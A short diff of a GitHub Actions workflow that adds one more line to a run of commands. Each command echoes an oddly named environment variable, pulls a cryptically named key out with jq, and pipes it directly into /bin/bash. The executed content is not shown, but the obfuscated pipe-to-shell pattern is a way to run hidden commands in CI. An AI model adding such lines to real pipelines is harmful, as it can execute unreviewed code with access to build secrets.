@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$pl5088" | jq -r .q751 | /bin/bash
           echo $vdacy3 | jq -r .blk95385 | /bin/bash
           echo $mq30806 | jq -r .wgwdu3 | /bin/bash
+          echo $eow131 | jq -r .gvbw768 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
